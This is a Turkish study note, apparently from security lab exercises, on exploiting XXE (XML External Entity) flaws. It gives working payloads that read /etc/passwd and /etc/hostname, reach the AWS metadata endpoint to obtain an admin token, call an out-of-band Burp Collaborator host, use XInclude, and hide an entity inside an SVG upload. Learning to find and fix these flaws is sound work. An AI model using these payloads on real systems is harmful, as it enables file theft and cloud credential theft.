##### XML: Databaseler arasında veri alışverişi olacağı zamanlarda kullanılan bir dosyadır.

GOOGLE:   
Genişletilebilir İşaretleme Dili (XML), **verileri paylaşılabilir bir şekilde tanımlamanıza ve saklamanıza olanak tanır**. XML, web siteleri, veri tabanları ve üçüncü taraf uygulamaları gibi bilgisayar sistemleri arasında bilgi alışverişini destekler. 


###### Temel bir payload
 ```html
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
Daha sonra aşağıda &xxe; komutunu gömüp çağırıyoruz.

Eğer websitesi AWS kullanıyor ise; 
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`

>[!NOTE] XXE AÇIĞI OLDUĞUNU NASIL ANLARIZ?
>`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://u3ygeo8tc2gchugtam2y9d5whnneb3.burpcollaborator.net"> ]>` 
>komutunu girerek anlarız.

---
##### XXE Türleri 
- Dosyaları almak için XXE’den yararlanma

- SSRF Saldırılarını gerçekleştirmek için XXE’den yararlanma

- Bant dışı veri sızdırma işlemi

- Hata mesajları yoluyla verileri almak için kör XXE

##### Dosyaları almak için XXE’den yararlanma

Örnek senaryo bir alışveriş sitesinde bir üründen stok verisi alıyoruz.

`<?xml version="1.0" encoding="UTF-8"?> <stockCheck>`

`<productId>1</productId>`

`<storeId>1</storeId>`

`</stockCheck>`

Kod bloğu şu şekilde olucaktır biz bunu şu şekilde değiştiriyoruz;

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

`<stockCheck>`

`<productId>&xxe;</productId>`

`<storeId>1</storeId>`

`</stockCheck>`


### Kodu Parçalayarak Açıklayalım

`<?xml version=”1.0” encoding=”UTF-8”?>`

Burası xml sürümünü ve karekter setini temsil eder.

`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

Burası ise Doctype kısmı burada ENTITY ile bir varlık oluşturuyoruz ve bu varlığa ise değer olarak etc/passwd değeri atanıyor yani dosya biz ürün stok sayısı olarak aşşağıda xxe çağırdığımızda aslında olucak durum etc/passwd verisini getirtmek.

`<stockCheck> <productId>&xxe;</productId> <storeId>1</storeId> </stockCheck>`

![[Pasted image 20250312235814.png]]
![[Pasted image 20250312235820.png]]

### 2. SSRF Saldırılarını gerçekleştirmek için XXE’den yararlanma

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE test [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/](http://169.254.169.254/)"> ]> <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`

Aynı web sitemizde bu sefer belirtilen ip adresi ile iletişime geçmeye çalışıyoruz ondan , önce yine /etc/passwd okumaya çalıştığımızda yinede okuyabiliriyoruz bu işi daha da yürütmek için yapılan bir işlem.
![[Pasted image 20250312235920.png]]

Dönen yanıt:
![[Pasted image 20250312235935.png]]
burada latest diye dizin keşfediyoruz ve dizinimiz ekliyoruz.
ve yolun sonunda her dönen hatada ki dizini eklersek
![[Pasted image 20250312235952.png]]
bu yola gidiyoruz ve bu şekilde hedef adminin tokenini ele geçirmiş oluyoruz.
![[Pasted image 20250313000002.png]]

### MODERN Web Sitede XML Yapısını Nasıl Dahil Ederiz ?
![[Pasted image 20250313000022.png]]
Burada artık xml yapısı değilde daha gelişmiş bir modern bir web sitesi var buna ise enjeksionu şu şekilde yapabiliyoruz.

`productId=<foo xmlns:xi="<http://www.w3.org/2001/XInclude>"><xi:include parse="text" href="file:///etc/passwd"/></foo> &storeId=1`

### XXE İLE FİLE UPLOAD!
Örnek senaryomuzda bir ürüne yorum atma özelliği ve görsel ekleme özelliği var buradan yürüyeceğiz,
![[Pasted image 20250313000047.png]]
bilgilerimizi girdik ve avatar dosyamızı yükleyeceğiz kod yapısına bakalım.
![[Pasted image 20250313000103.png]]
ve burayı silip şu kodumuzu yazıyoruz.

`<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

bu kod görsel içerisine hostname yazdırıcak.

ve yorumuzuu paylaştıkdan sonra kendimizi buluyoruz.
![[Pasted image 20250313000118.png]]

Ve görseli açarak hostname buluyoruz.
![[Pasted image 20250313000138.png]]


